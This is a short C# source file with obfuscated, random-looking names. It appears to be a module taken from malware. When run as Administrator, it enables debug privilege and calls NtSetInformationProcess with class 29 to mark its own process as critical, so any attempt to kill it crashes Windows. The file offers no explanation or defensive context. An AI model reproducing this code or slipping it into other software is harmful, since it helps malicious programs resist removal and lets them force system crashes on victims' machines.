using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace vQzMGKHeycFziMq;

public static class cJheUZOIFJoYsp
{
	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern int NtSetInformationProcess(IntPtr ijOYPlOZJjGisl, int EMdkIHvckD, ref int czpBYsHueGq, int WkSXUVspxF);

	public static void RIhhBdSAUjjsMSz()
	{
		if (FPDHkrXiHuBo())
		{
			foWoyaICHaij();
		}
	}

	public static void foWoyaICHaij()
	{
		int czpBYsHueGq = 1;
		Process.EnterDebugMode();
		NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref czpBYsHueGq, 4);
	}

	public static bool FPDHkrXiHuBo()
	{
		return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
	}
}
